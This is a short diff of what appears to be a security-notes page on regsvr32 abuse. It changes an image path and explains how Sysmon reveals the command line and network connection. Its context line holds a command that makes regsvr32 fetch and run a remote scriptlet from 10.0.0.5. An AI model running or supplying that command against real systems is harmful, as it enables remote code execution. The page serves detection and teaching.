@@ -43,7 +43,7 @@ regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
 
 Note how regsvr32 process exits almost immediately. This means just by looking at the process list you may not suspect a process until you realise how it was invoked. Sysmon commandline parameters logging capability though will show what you need to see:
 
-![](../.gitbook/assets/regsvr32-commandline%20%281%29.png)
+![](../.gitbook/assets/regsvr32-commandline.png)
 
 Additionally, sysmon will show regsvr32 establishing a network connection:
 
